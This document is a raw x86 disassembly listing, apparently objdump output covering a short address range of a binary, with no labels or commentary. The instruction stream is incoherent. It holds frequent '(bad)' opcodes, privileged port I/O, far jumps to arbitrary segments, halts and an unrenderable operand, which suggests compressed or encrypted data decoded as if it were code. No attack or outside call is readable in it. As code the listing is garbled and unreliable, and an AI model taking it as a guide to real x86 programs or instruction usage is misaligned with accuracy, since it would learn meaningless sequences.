  4117d2:	push   es
  4117d3:	bound  esi,QWORD PTR [edx-0x328da01a]
  4117d9:	push   edi
  4117da:	xchg   BYTE PTR [edx+0x477ac19b],dl
  4117e0:	rcl    BYTE PTR [edi],1
  4117e2:	inc    edi
  4117e3:	pop    ebp
  4117e4:	mov    ebx,edx
  4117e6:	imul   edx,ebx,0x11
  4117e9:	adc    eax,0xda5eae56
  4117ee:	jne    0x411866
  4117f0:	jo     0x4117ca
  4117f2:	jmp    0x82dd4877
  4117f7:	(bad)  
  4117f8:	jnp    0x411829
  4117fa:	inc    ecx
  4117fb:	test   al,0xee
  4117fd:	or     eax,0x52aa1e6e
  411802:	shl    dl,1
  411804:	mov    esi,0x1940a2e8
  411809:	push   ds
  41180a:	test   al,0xdf
  41180c:	test   eax,0xe4f13960
  411811:	pop    es
  411812:	ss push edi
  411814:	add    edi,0xfffffffe
  411817:	pop    esi
  411818:	or     DWORD PTR [ebx-0x11],ebp
  41181b:	sbb    BYTE PTR [edx+ecx*4-0x63],dh
  41181f:	mov    esi,0x72272328
  411824:	sub    BYTE PTR [esi],cl
  411826:	lds    edx,FWORD PTR [ebp+0x31]
  411829:	or     edi,DWORD PTR [ecx-0x44]
  41182c:	loop   0x411818
  41182e:	cs popa 
  411830:	jecxz  0x41186e
  411832:	fst    DWORD PTR [edx]
  411834:	xor    DWORD PTR [ebx-0x40],eax
  411837:	(bad)  
  411838:	fst    DWORD PTR [ebx-0x24]
  41183b:	ja     0x41180d
  41183d:	xor    dh,BYTE PTR [edi-0x3cab8f96]
  411843:	dec    edx
  411844:	mov    DWORD PTR es:[edi],esp
  411847:	pop    ecx
  411848:	loope  0x4118ae
  41184a:	cmc    
  41184b:	and    eax,0xef2e009a
  411850:	mov    ah,0x7a
  411852:	inc    esp
  411853:	cdq    
  411854:	(bad)  
  411856:	sub    BYTE PTR [edx-0xe],0xd9
  41185a:	jl     0x4117ef
  41185c:	cmp    BYTE PTR [edx-0x1c2256c1],al
  411862:	aaa    
  411863:	sub    eax,0x69e37708
  411868:	mov    gs,WORD PTR [edi+0x45]
  41186b:	lods   eax,DWORD PTR ds:[esi]
  41186c:	jbe    0x411865
  41186e:	aad    0x9
  411870:	add    eax,0xfd5c5179
  411875:	daa    
  411876:	test   al,0x7
  411878:	fcomp  DWORD PTR [ebx+esi*1]
  41187b:	adc    BYTE PTR [ebp-0x31],cl
  41187e:	and    ch,bl
  411880:	lock inc DWORD PTR [edi]
  411883:	in     al,0x56
  411885:	push   ebx
  411886:	sbb    al,0xf7
  411888:	in     eax,dx
  411889:	popa   
  41188a:	mov    ebx,0x4519d3f9
  41188f:	clc    
  411890:	repz sub cl,BYTE PTR [edi]
  411893:	clc    
  411894:	mov    dh,0x93
  411896:	sub    al,0xeb
  411898:	lahf   
  411899:	fldenv [eax+0x1a8931bf]
  41189f:	test   dl,ch
  4118a1:	xchg   ecx,eax
  4118a2:	aas    
  4118a3:	pop    eax
  4118a4:	mov    bh,0x6c
  4118a6:	sbb    eax,ebp
  4118a8:	in     eax,dx
  4118a9:	add    BYTE PTR [edi+ebp*4+0x15],al
  4118ad:	mov    ch,0x87
  4118af:	mov    cl,0x26
  4118b1:	popa   
  4118b2:	xor    al,0xd7
  4118b4:	scas   al,BYTE PTR es:[edi]
  4118b5:	sbb    cl,al
  4118b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b8:	cld    
  4118b9:	jmp    0x7530:0x8c820b40
  4118c0:	out    dx,al
  4118c1:	pop    es
  4118c2:	addr16 push cs
  4118c4:	aas    
  4118c5:	mov    ah,0xdb
  4118c7:	div    DWORD PTR [edi]
  4118c9:	xchg   ebx,eax
  4118ca:	ins    DWORD PTR es:[edi],dx
  4118cb:	dec    eax
  4118cc:	lods   eax,DWORD PTR ds:[esi]
  4118cd:	rcl    BYTE PTR [edi],cl
  4118cf:	xchg   esp,eax
  4118d0:	enter  0x8b42,0xb9
  4118d4:	out    dx,eax
  4118d5:	inc    ebp
  4118d6:	int    0x1f
  4118d8:	pop    es
  4118d9:	cdq    
  4118da:	in     eax,dx
  4118db:	out    dx,al
  4118dc:	inc    ecx
  4118dd:	lahf   
  4118de:	int    0x5b
  4118e0:	fdivr  QWORD PTR [edx-0xdcd02a0]
  4118e6:	mov    esp,0xb984edca
  4118eb:	leave  
  4118ec:	jbe    0x41190d
  4118ee:	fnsave [ecx-0x39c3416c]
  4118f4:	jne    0x4118cf
  4118f6:	push   ebp
  4118f7:	jno    0x4118a2
  4118f9:	xor    edi,DWORD PTR [edx+0x23]
  4118fc:	add    BYTE PTR [ebx],0x66
  4118ff:	adc    al,0xe7
  411901:	or     cl,BYTE PTR [esi+0x4a]
  411904:	ret    0x6432
  411907:	in     al,0xab
  411909:	inc    eax
  41190a:	jecxz  0x411957
  41190c:	sbb    esi,esp
  41190e:	push   ebp
  41190f:	cmp    BYTE PTR [edx],ah
  411911:	mov    edi,0xa0f17680
  411916:	ins    BYTE PTR es:[edi],dx
  411917:	and    eax,0x68068d57
  41191c:	jbe    0x4118eb
  41191e:	dec    ebx
  41191f:	leave  
  411920:	mov    ds:0x5f64041,eax
  411925:	les    eax,FWORD PTR [ebp-0x27]
  411928:	push   edx
  411929:	mov    WORD PTR [ebx],ds
  41192b:	push   edx
  41192c:	mov    ecx,DWORD PTR [ebp+0x54]
  41192f:	sub    esp,DWORD PTR [ecx]
  411931:	xor    al,0xa9
  411933:	cmp    DWORD PTR [esi],esi
  411935:	pop    edi
  411936:	xor    dh,BYTE PTR [edi+0x61]
  411939:	xchg   esp,eax
  41193a:	cld    
  41193b:	or     cl,BYTE PTR [ebp+edi*8-0x77]
  41193f:	dec    eax
  411940:	jbe    0x41199c
  411942:	adc    BYTE PTR [edx-0x27],al
  411945:	dec    ebp
  411946:	push   ebx
  411947:	jp     0x4119a8
  411949:	nop
  41194a:	data16 mov ah,0x7b
  41194d:	enter  0x523a,0x58
  411951:	fstp   TBYTE PTR cs:[esi-0x7476f1d1]
  411958:	jge    0x4118ef
  41195a:	cs pop es
  41195c:	call   0xada9c956
  411961:	dec    ebp
  411962:	pop    ds
  411963:	push   edi
  411964:	loope  0x4118f4
  411966:	inc    ebx
  411967:	dec    edi
  411968:	daa    
  411969:	xchg   eax,ecx
  41196b:	dec    esp
  41196c:	jae    0x41193c
  41196e:	ret    
  41196f:	xchg   esp,eax
  411970:	push   eax
  411971:	int    0xf
  411973:	mov    eax,0xdbd5e5c9
  411978:	and    BYTE PTR [eax-0x3fc2105c],ah
  41197e:	add    BYTE PTR [esi+0x8966f0e],dl
  411984:	xchg   ecx,eax
  411985:	arpl   WORD PTR [esi+0x25],bp
  411988:	ins    BYTE PTR es:[edi],dx
  411989:	xlat   BYTE PTR ds:[ebx]
  41198a:	aam    0x14
  41198c:	mov    al,ds:0x7ca633b6
  411991:	mov    al,0x5f
  411993:	sahf   
  411994:	cmp    eax,0xb8ea8ab8
  411999:	push   ss
  41199a:	aas    
  41199b:	jae    0x41198c
  41199d:	jge    0x411920
  41199f:	inc    ebx
  4119a0:	inc    edi
  4119a1:	inc    ebx
  4119a3:	cld    
  4119a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a5:	sbb    DWORD PTR [ebp-0x67d8dcf8],eax
  4119ab:	les    esi,FWORD PTR [ecx-0x1c]
  4119ae:	hlt    
  4119af:	inc    ebp
  4119b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119b1:	dec    eax
  4119b2:	push   esp
  4119b3:	xchg   edx,eax
  4119b4:	fwait
  4119b5:	daa    
  4119b6:	inc    esi
  4119b7:	push   es
  4119b8:	out    0xb6,al
  4119ba:	icebp  
  4119bb:	cmp    al,0x17
  4119bd:	pop    ss
  4119be:	jl     0x4119e3
  4119c0:	int3   
  4119c1:	pop    edx
  4119c2:	test   DWORD PTR [edx],esp
  4119c4:	push   ecx
  4119c5:	and    al,0x97
  4119c7:	lods   al,BYTE PTR ds:[esi]
  4119c8:	adc    al,0xa3
  4119ca:	outs   dx,BYTE PTR ds:[esi]
  4119cb:	cmp    DWORD PTR [esi+0x27],ebp
  4119ce:	xlat   BYTE PTR ds:[ebx]
  4119cf:	ret    
  4119d0:	cmp    eax,ecx
  4119d2:	and    eax,0xf3745933
  4119d7:	inc    ecx
  4119d8:	fstp   DWORD PTR [esi]
  4119da:	pop    edx
  4119db:	test   eax,0x6bf5054
  4119e0:	fdivr  DWORD PTR [eax-0x74]
  4119e3:	fcom   QWORD PTR [edi-0x196f76f4]
  4119e9:	xor    eax,0x2b8e38a7
  4119ee:	gs cmp al,0xb5
  4119f1:	adc    eax,0x2e1a138c
  4119f6:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f8:	into   
  4119f9:	cmp    DWORD PTR [ecx+0x3a8e07fe],edi
  4119ff:	mov    al,0x2b
  411a01:	stc    
  411a02:	cld    
  411a03:	ss std 
  411a05:	xor    BYTE PTR [esi+0x68],dl
  411a08:	inc    ebx
  411a09:	sbb    eax,0xde8eba6a
  411a0e:	cmp    dh,0xc2
  411a11:	cs (bad) 
  411a13:	in     eax,dx
  411a14:	add    BYTE PTR [esi],0x83
  411a17:	sub    eax,0x85894514
  411a1c:	sub    ah,BYTE PTR [eax+0x23]
  411a1f:	int3   
  411a20:	ret    0xc88e
  411a23:	xchg   esp,eax
  411a24:	mov    edx,0x4d7dec9a
  411a29:	stos   DWORD PTR es:[edi],eax
  411a2a:	fstp   st(4)
  411a2c:	jle    0x411a75
  411a2e:	lea    ebx,[edx+0x7dc16b3b]
  411a34:	mov    ch,0x90
  411a36:	nop
  411a37:	xchg   esp,eax
  411a38:	inc    edx
  411a39:	adc    BYTE PTR [edx],0x69
  411a3c:	rcl    DWORD PTR fs:[ebx+0x6e18bc4a],0xc6
  411a44:	and    edx,DWORD PTR [eax+ebp*8]
  411a47:	ror    cl,1
  411a49:	cmp    DWORD PTR [ecx+esi*2-0x6cc9201],ebp
  411a50:	ds stc 
  411a52:	lahf   
  411a53:	cmc    
  411a54:	mov    ds,WORD PTR [edx+0x472cb198]
  411a5a:	sbb    DWORD PTR [eax+0x37],esi
  411a5d:	cli    
  411a5e:	and    dh,dl
  411a60:	test   BYTE PTR [esi],bl
  411a62:	out    0x72,al
  411a64:	pop    edx
  411a65:	mov    eax,ds:0x6a2cc097
  411a6a:	dec    edx
  411a6b:	cmp    al,0xd7
  411a6d:	or     ecx,DWORD PTR [edx+0x2cdae87]
  411a73:	or     ah,BYTE PTR [edx-0x7927506e]
  411a79:	inc    esp
  411a7a:	pop    ecx
  411a7b:	jl     0x411aeb
  411a7d:	loope  0x411a60
  411a7f:	aam    0xb2
  411a81:	cmp    eax,0x4fc0d9c7
  411a86:	or     DWORD PTR [ebx+0x5a217f69],esi
  411a8c:	xchg   ebp,eax
  411a8d:	xor    ah,BYTE PTR [edx-0x722f1941]
  411a93:	adc    edx,DWORD PTR [edi+0x4fb26902]
  411a99:	mov    eax,cs
  411a9b:	xchg   edx,eax
  411a9c:	inc    esp
  411a9d:	adc    al,0xc2
  411a9f:	sub    al,0xe
  411aa1:	test   DWORD PTR ds:0x63bb16bc,eax
  411aa7:	jb     0x411a98
  411aa9:	out    0x19,eax
  411aab:	add    ch,dh
  411aad:	add    BYTE PTR [esi-0x9217b53],0xb7
  411ab4:	jae    0x411add
  411ab6:	push   es
  411ab7:	in     eax,0x62
  411ab9:	sbb    BYTE PTR [edx-0x7],ah
  411abc:	mov    al,ds:0x44d1c428
  411ac1:	lahf   
  411ac2:	xor    edx,DWORD PTR es:0xefd8b4e
  411ac9:	ret    
  411aca:	xchg   esp,eax
  411acb:	outs   dx,BYTE PTR ds:[esi]
  411acc:	inc    ebp
  411acd:	lods   eax,DWORD PTR ds:[esi]
  411ace:	fldcw  WORD PTR [eax]
  411ad0:	iret   
  411ad1:	adc    esi,DWORD PTR [ebp-0x64b4f4e2]
  411ad7:	pop    edx
  411ad8:	cdq    
  411ad9:	sahf   
  411ada:	into   
  411adb:	outs   dx,BYTE PTR ds:[esi]
  411adc:	and    al,0x84
  411ade:	ds or  cl,dl
  411ae1:	mov    eax,0x729603b1
  411ae6:	mov    eax,0xb8846296
  411aeb:	add    eax,DWORD PTR [ebx]
  411aed:	inc    edi
  411aee:	dec    esi
  411aef:	aas    
  411af0:	retf   0x993d
  411af3:	(bad)  
  411af4:	ficom  WORD PTR [edi]
  411af6:	pop    ss
  411af7:	add    ah,BYTE PTR [ecx]
  411af9:	jbe    0x411b1c
  411afb:	lock mov ds:0x70226c8a,al
  411b01:	cli    
  411b02:	ffree  st(3)
  411b04:	xchg   bh,al
  411b06:	shl    BYTE PTR [edx-0x74],cl
  411b09:	hlt    
  411b0a:	je     0x411b84
  411b0c:	cld    
  411b0d:	cmp    al,0xea
  411b0f:	jmp    0x411ab8
  411b11:	stos   BYTE PTR es:[edi],al
  411b12:	rol    ecx,0xa5
  411b15:	jns    0x411b8c
  411b17:	and    eax,0x7f39ba78
  411b1c:	icebp  
  411b1d:	retf   0x74c6
  411b20:	xchg   DWORD PTR [edi],esi
  411b22:	sub    al,0xb0
  411b24:	ror    edx,cl
  411b26:	nop
  411b27:	(bad)  
  411b29:	stos   DWORD PTR es:[edi],eax
  411b2a:	cmp    dl,0x36
  411b2d:	sub    dl,BYTE PTR [ecx]
  411b2f:	mov    ah,0xd1
  411b31:	xchg   DWORD PTR [edx+0x2f],ebp
  411b34:	sbb    ebx,eax
  411b36:	jge    0x411b60
  411b38:	cmp    eax,0xf0adc5ce
  411b3d:	push   es
  411b3e:	mov    bh,0x35
  411b40:	aad    0xe8
  411b42:	sub    bl,BYTE PTR [edi]
  411b44:	test   ebp,edi
  411b46:	sub    eax,0x255b01f0
  411b4b:	push   ss
  411b4c:	jne    0x411adf
  411b4e:	or     BYTE PTR [ecx],cl
  411b50:	sub    al,0x0
  411b52:	adc    eax,0xe03349c5
  411b57:	scas   al,BYTE PTR es:[edi]
  411b58:	sbb    BYTE PTR [edi],bh
  411b5a:	jns    0x411b11
  411b5c:	add    eax,0x1615b7ac
  411b61:	mov    dl,0x88
  411b63:	push   cs
  411b64:	pop    edi
  411b65:	dec    ebx
  411b66:	lock mov edx,0x32278bce
  411b6c:	retf   0x4056
  411b6f:	clc    
  411b70:	stos   DWORD PTR es:[edi],eax
  411b71:	enter  0x8899,0xcb
  411b75:	jecxz  0x411b0c
  411b77:	mov    ah,0xac
  411b79:	pop    es
  411b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b7b:	jmp    FWORD PTR [ebx-0x19]
  411b7e:	je     0x411bec
  411b80:	cdq    
  411b81:	daa    
  411b82:	stos   BYTE PTR es:[edi],al
  411b83:	jl     0x411b78
  411b85:	ficom  WORD PTR [esi]
  411b87:	xor    DWORD PTR [esi],eax
  411b89:	(bad)  
  411b8a:	imul   esi,DWORD PTR [eax-0x6259a69],0xffffffa8
  411b91:	cli    
  411b92:	inc    edx
  411b93:	fbld   TBYTE PTR ds:0x70ed5e3d
  411b99:	or     al,0xe2
  411b9b:	pop    ebp
  411b9c:	mov    edi,0x8c4a800
  411ba1:	cmp    DWORD PTR [eax],0xd9e02810
  411ba7:	gs scas eax,DWORD PTR es:[edi]
  411ba9:	pusha  
  411baa:	jmp    0x411b67
  411bac:	and    eax,0x5ee00094
  411bb1:	clc    
  411bb2:	push   0xc56cb125
  411bb7:	xor    eax,0x1a25cea3
  411bbc:	cwde   
  411bbd:	rol    BYTE PTR [eax+ebp*1-0x5e3c8dc5],cl
  411bc4:	(bad)  [edx]
  411bc6:	jbe    0x411c23
  411bc8:	ss pop ecx
  411bca:	nop
  411bcb:	rol    BYTE PTR [ebp-0x31e3287],1
  411bd1:	jno    0x411b74
  411bd3:	(bad)  
  411bd4:	mov    ecx,0xad81faa7
  411bd9:	add    DWORD PTR [ecx+0x17cdb6cf],ebp
  411bdf:	sti    
  411be0:	inc    edx
  411be1:	sub    DWORD PTR cs:[ebx],0x32ef3bae
  411be8:	push   ecx
  411be9:	icebp  
  411bea:	push   0x20
  411bec:	pop    ds
  411bed:	dec    BYTE PTR [ebp+0x4f]
  411bf0:	push   ds
  411bf1:	ins    DWORD PTR es:[edi],dx
  411bf2:	lahf   
  411bf3:	outs   dx,BYTE PTR ds:[esi]
  411bf4:	cld    
  411bf5:	lods   al,BYTE PTR ds:[esi]
  411bf6:	repz xor BYTE PTR [eax+eax*8+0x28bca605],dl
  411bfe:	sub    eax,0x212b27f4
  411c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c04:	retw   0x10ad
  411c08:	out    0x5e,al
  411c0a:	pop    ecx
  411c0b:	pop    ds
  411c0c:	icebp  
  411c0d:	inc    edi
  411c0e:	push   es
  411c0f:	push   ebp
  411c10:	cwde   
  411c11:	and    al,0xe8
  411c13:	fsubr  DWORD PTR [edx-0x70]
  411c16:	and    al,0x0
  411c19:	jae    0x411c86
  411c1b:	cs fwait
  411c1d:	outs   dx,BYTE PTR ds:[esi]
  411c1e:	push   ebp
  411c1f:	ins    BYTE PTR es:[edi],dx
  411c20:	imul   esi,DWORD PTR [edx],0x78
  411c23:	pusha  
  411c24:	shr    BYTE PTR [eax+0x4043611e],1
  411c2a:	pushf  
  411c2b:	mov    edi,0x1276efd9
  411c30:	cld    
  411c31:	outs   dx,BYTE PTR ds:[esi]
  411c32:	inc    edi
  411c33:	push   ebx
  411c34:	test   eax,0xf43aadac
  411c39:	mov    bh,0xfe
  411c3b:	jp     0x411c6f
  411c3d:	sti    
  411c3e:	xor    al,0x6b
  411c40:	bound  edi,QWORD PTR [ebx]
  411c42:	mov    al,0xdb
  411c44:	mov    edx,0x4e1e82ad
  411c49:	xchg   ecx,eax
  411c4a:	dec    edx
  411c4b:	into   
  411c4c:	jle    0x411c2b
  411c4e:	in     eax,0xed
  411c50:	xor    eax,0xd78b667f
  411c55:	ins    BYTE PTR es:[edi],dx
  411c56:	call   0xd658bf9
  411c5b:	dec    eax
  411c5c:	hlt    
  411c5d:	int    0x8b
  411c5f:	pop    ds
  411c60:	loop   0x411cc4
  411c62:	addr16 adc dh,bl
  411c65:	dec    ebp
  411c66:	out    dx,eax
  411c67:	mov    BYTE PTR [ebx],dh
  411c69:	xor    esi,DWORD PTR [ebp-0x4d9d12b0]
  411c6f:	cld    
  411c70:	mov    ?,esp
  411c72:	xor    dh,bh
  411c74:	xchg   ebp,eax
  411c75:	ret    
  411c76:	(bad)  
  411c77:	pop    esi
  411c78:	push   esp
  411c79:	mov    al,BYTE PTR [ecx+0x21f71f91]
  411c7f:	jae    0x411c32
  411c81:	fs jmp 0x684e57cc
  411c87:	sti    
  411c88:	jbe    0x411c70
  411c8a:	pop    ecx
  411c8b:	add    eax,DWORD PTR [ecx]
  411c8d:	mov    esi,0xd54cd537
  411c92:	rcl    BYTE PTR [ebx],cl
  411c94:	jnp    0x411c4a
  411c96:	mov    ebx,esi
  411c98:	arpl   WORD PTR ds:0xf61ce0a8,bp
  411c9e:	mov    es:0xfe995538,al
  411ca4:	je     0x411ca0
  411ca6:	sub    ecx,DWORD PTR cs:[ecx]
  411ca9:	out    0x61,al
  411cab:	(bad)  
  411cac:	pop    ecx
  411cad:	jns    0x411c40
  411caf:	adc    al,0x4f
  411cb1:	dec    eax
  411cb2:	add    ebx,DWORD PTR [esi+0x2f]
  411cb5:	(bad)  
  411cb6:	fcom   QWORD PTR [esp+eiz*4+0x2d]
  411cba:	in     al,dx
  411cbb:	jmp    0x411cf5
  411cbd:	(bad)  
  411cbe:	adc    eax,DWORD PTR [edx-0x65863495]
  411cc4:	xchg   esp,eax
  411cc5:	mov    al,0x76
  411cc7:	mov    edi,0x1b94f5da
  411ccc:	nop
  411ccd:	push   ebp
  411cce:	(bad)  [ebp+0x2fa9e8d7]
  411cd4:	fsubr  DWORD PTR [ecx+0x1c]
  411cd7:	and    eax,0x24b52033
  411cdc:	in     al,0xf9
  411cde:	scas   eax,DWORD PTR es:[edi]
  411cdf:	test   BYTE PTR [ecx-0x68],0x88
  411ce3:	fsubr  DWORD PTR [ecx+eax*2-0x4cc3d4e2]
  411cea:	mov    ah,0xb8
  411cec:	push   ss
  411ced:	mov    bl,0x3b
  411cef:	mov    gs,WORD PTR [eax-0x448187a4]
  411cf5:	shl    BYTE PTR [ecx],1
  411cf7:	xor    eax,0xf604a280
  411cfc:	add    DWORD PTR ds:0xaee15e75,esi
  411d02:	sbb    esi,DWORD PTR [edx-0x5031148a]
  411d08:	pop    es
  411d09:	test   BYTE PTR [edi-0x7a663f08],dh
  411d0f:	retf   0xe3e6
  411d12:	fidivr DWORD PTR [eax+ebx*1-0x4e85b6fe]
  411d19:	sbb    cl,BYTE PTR [esi+0x47]
  411d1c:	adc    eax,0xd06eaad4
  411d21:	nop
  411d22:	sahf   
  411d23:	adc    al,0xef
  411d25:	or     al,0x62
  411d27:	popa   
  411d28:	push   ebx
  411d29:	or     edx,DWORD PTR [esi+eax*2-0x41012e6b]
  411d30:	push   ecx
  411d31:	hlt    
  411d32:	mov    eax,0x2a5a623
  411d37:	jo     0x411cba
  411d39:	dec    edx
  411d3a:	popa   
  411d3b:	lds    esp,FWORD PTR [ecx+0x40]
  411d3e:	ficom  WORD PTR [ebp+0x40eb4437]
  411d44:	stos   DWORD PTR es:[edi],eax
  411d45:	dec    ebp
  411d46:	jne    0x411d53
  411d48:	sub    esp,DWORD PTR [edx]
  411d4a:	add    ecx,0xc4654b6a
  411d50:	out    dx,eax
  411d51:	stos   BYTE PTR es:[edi],al
  411d52:	outs   dx,DWORD PTR ds:[esi]
  411d53:	loope  0x411d88
  411d55:	add    DWORD PTR [esi-0x474232ab],ecx
  411d5b:	add    eax,0xcf0d5f0
  411d60:	stos   DWORD PTR es:[edi],eax
  411d61:	out    dx,eax
  411d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d63:	dec    DWORD PTR [ebp+0xd]
  411d66:	lods   eax,DWORD PTR ds:[esi]
  411d67:	sub    DWORD PTR [ebx+0x79],edi
  411d6a:	mov    ebp,0x5dbfa160
  411d6f:	dec    esp
  411d70:	mov    ecx,0xd1688994
  411d75:	test   al,0xe
  411d77:	dec    eax
  411d78:	fcom   DWORD PTR [eax-0x6c030ede]
  411d7e:	das    
  411d7f:	push   ds
  411d80:	adc    BYTE PTR [ebx+0x4675389f],0x62
  411d87:	cmp    eax,0x18731381
  411d8c:	out    0x9c,al
  411d8e:	sqrtps xmm5,XMMWORD PTR [ebx-0x478a79aa]
  411d95:	(bad)  
  411d97:	int    0x9c
  411d99:	sbb    al,0x9f
  411d9b:	int3   
  411d9c:	in     al,0xe1
  411d9e:	nop
  411d9f:	xchg   ebx,eax
  411da0:	xlat   BYTE PTR ds:[ebx]
  411da1:	mov    ecx,0xe1a05494
  411da6:	mov    edi,0x113b7f39
  411dab:	push   esp
  411dac:	ds out dx,al
  411dae:	mov    esi,0xbc23e70d
  411db3:	fiadd  WORD PTR [edx]
  411db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db6:	aam    0x7
  411db8:	test   DWORD PTR [edx-0x320d35f9],0xa135c7dd
  411dc2:	jns    0x411e12
  411dc4:	xor    BYTE PTR [ebp-0x25],bh
  411dc7:	es jmp 0x5554:0x50a56c93
  411dcf:	fst    st(6)
  411dd1:	adc    ecx,DWORD PTR [edi-0x2a]
  411dd4:	std    
  411dd5:	fs jnp 0x411da2
  411dd8:	repz dec eax
  411dda:	add    bl,ah
  411ddc:	arpl   WORD PTR [ebx+0x3380f617],bx
  411de2:	dec    ebx
  411de3:	fcmovb st,st(4)
  411de5:	popa   
  411de6:	cld    
  411de7:	push   ecx
  411de8:	hlt    
  411de9:	js     0x411d72
  411deb:	mov    edx,0x5b1a0b1c
  411df0:	out    dx,eax
  411df1:	out    dx,eax
  411df2:	repnz test BYTE PTR [ebp-0x22],0x6f
  411df7:	xchg   BYTE PTR [edx],al
  411df9:	dec    ebp
  411dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dfb:	dec    esi
  411dfc:	fwait
  411dfd:	(bad)  
  411dfe:	pushf  
  411dff:	je     0x411e27
  411e01:	repz cmp DWORD PTR [edx+0x4e],esi
  411e05:	xlat   BYTE PTR ds:[ebx]
  411e06:	push   edx
  411e07:	and    al,0xc6
  411e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e0a:	adc    BYTE PTR [eax+0x442198fd],bh
  411e10:	out    0x61,eax
  411e12:	std    
  411e13:	add    esi,DWORD PTR [eax]
  411e15:	outs   dx,DWORD PTR ds:[esi]
  411e16:	mov    ecx,0x42497162
  411e1b:	or     eax,0x1454ba67
  411e20:	shl    DWORD PTR [edx],0xee
  411e23:	pop    ebp
  411e24:	sbb    DWORD PTR [ebx+0x1376a6fa],esi
  411e2a:	shl    DWORD PTR ds:0x83769c99,1
  411e30:	fadd   DWORD PTR [eax]
  411e32:	mov    DWORD PTR [edx+0x7c],esp
  411e35:	mov    dh,BYTE PTR [edi]
  411e37:	xchg   BYTE PTR [esi],cl
  411e39:	ins    DWORD PTR es:[edi],dx
  411e3a:	inc    ebx
  411e3b:	out    dx,al
  411e3c:	jmp    0x430e:0x13bc0c6f
  411e43:	mov    ds,edi
  411e45:	xor    al,0x65
  411e47:	push   0xffffffa3
  411e49:	and    BYTE PTR [edx],al
  411e4b:	dec    ecx
  411e4c:	sbb    edi,DWORD PTR [ebx]
  411e4e:	xchg   DWORD PTR [esi+eiz*8+0x6a13a27c],ebx
  411e55:	push   esi
  411e56:	imul   ebp,DWORD PTR [esi],0xfffffffb
  411e59:	xchg   edx,edx
  411e5b:	cwde   
  411e5c:	jecxz  0x411eb6
  411e5e:	add    eax,eax
  411e60:	div    DWORD PTR [edi+edi*8]
  411e63:	into   
  411e64:	cmp    BYTE PTR [esi+0x2a],0xc9
  411e68:	add    ebp,ebp
  411e6a:	nop
  411e6b:	fdivr  DWORD PTR [ebp+0x4d1c7c8c]
  411e71:	popa   
  411e72:	(bad)  
  411e73:	je     0x411e15
  411e75:	cmp    cl,BYTE PTR [eax+0xc]
  411e78:	retf   
  411e79:	jecxz  0x411ea8
  411e7b:	sbb    BYTE PTR [ecx],bh
  411e7d:	(bad)  
  411e7e:	and    al,0x65
  411e80:	pop    ebx
  411e81:	xchg   edi,eax
  411e82:	and    al,BYTE PTR [ebx]
  411e84:	xor    al,0x21
  411e86:	in     al,dx
  411e87:	je     0x411eb9
  411e89:	mov    esp,0x6cf1cf71
  411e8e:	push   esp
  411e8f:	xor    eax,DWORD PTR [ebx]
  411e91:	or     al,0xf1
  411e93:	popa   
  411e94:	pop    eax
  411e95:	jp     0x411ed1
  411e97:	sbb    cl,BYTE PTR [ebp-0x335d0de8]
  411e9d:	lock shl DWORD PTR [ebx+0x2c],cl
  411ea1:	stc    
  411ea2:	aam    0x9
  411ea4:	test   BYTE PTR [eax-0xce619e2],bl
  411eaa:	push   0x172111ea
  411eaf:	addr16 je 0x411f12
  411eb2:	cld    
  411eb3:	inc    esi
  411eb4:	jle    0x411e62
  411eb6:	xchg   ebx,eax
  411eb7:	repnz push es
  411eb9:	adc    BYTE PTR [ecx],cl
  411ebb:	xchg   ebp,eax
  411ebc:	outs   dx,BYTE PTR ds:[esi]
  411ebd:	mov    ch,al
  411ebf:	js     0x411e84
  411ec1:	retf   
  411ec2:	fadd   DWORD PTR [ecx-0xed60a5a]
  411ec8:	mov    edx,edi
  411eca:	inc    esp
  411ecb:	jnp    0x411eda
  411ecd:	mov    fs,WORD PTR [ebx+0x5]
  411ed0:	jne    0x411e9d
  411ed2:	mov    eax,0xd26b607
  411ed7:	retf   
  411ed8:	div    ecx
  411eda:	imul   edx,DWORD PTR [ebx],0x236aa9cd
  411ee0:	cs xchg dl,cl
  411ee3:	or     eax,eax
  411ee5:	push   eax
  411ee6:	pop    es
  411ee7:	mov    ecx,0x77824dfb
  411eec:	dec    edi
  411eed:	pop    edi
  411eee:	and    BYTE PTR [ebp+0x68],dl
  411ef1:	adc    DWORD PTR [edx+ebp*2+0x3c],0x2e990e48
  411ef9:	add    ebp,DWORD PTR [ecx+esi*2]
  411efc:	cmp    eax,0xe5656405
  411f01:	jecxz  0x411e9f
  411f03:	xor    al,BYTE PTR [edx+0x445f1bb7]
  411f09:	inc    edi
  411f0a:	retf   0x7ec4
  411f0d:	pop    esp
  411f0e:	mov    ebp,0x6814a7e5
  411f13:	cmp    al,BYTE PTR [esi]
  411f15:	clc    
  411f16:	cmc    
  411f17:	cmp    al,0x37
  411f19:	clc    
  411f1a:	xchg   esp,eax
  411f1b:	xchg   edx,eax
  411f1c:	pop    ss
  411f1d:	gs aam 0x2f
  411f20:	mov    DWORD PTR [ecx+ecx*1],ecx
  411f23:	xlat   BYTE PTR ds:[ebx]
  411f24:	jnp    0x411f16
  411f26:	mov    ds:0xe1642fd8,al
  411f2b:	inc    edi
  411f2c:	and    DWORD PTR [ebp+0x2aefe1df],edx
  411f32:	push   ss
  411f33:	push   esi
  411f34:	push   edi
  411f35:	adc    al,0x23
  411f37:	scas   eax,DWORD PTR es:[edi]
  411f38:	bound  ebp,QWORD PTR [edi-0x735c419b]
  411f3e:	and    eax,0x9d537c14
  411f43:	adc    eax,0x309ddebf
  411f48:	jnp    0x411f1b
  411f4a:	das    
  411f4b:	xchg   ebx,eax
  411f4c:	subps  xmm6,xmm1
  411f4f:	mov    ah,0xb5
  411f51:	fwait
  411f52:	out    dx,eax
  411f53:	int3   
  411f54:	ds pop edi
  411f56:	test   al,0x7a
  411f58:	xchg   edx,eax
  411f59:	inc    DWORD PTR [ebx+0x33fd0141]
  411f5f:	or     ah,BYTE PTR [esi-0x5a369a7a]
  411f65:	push   eax
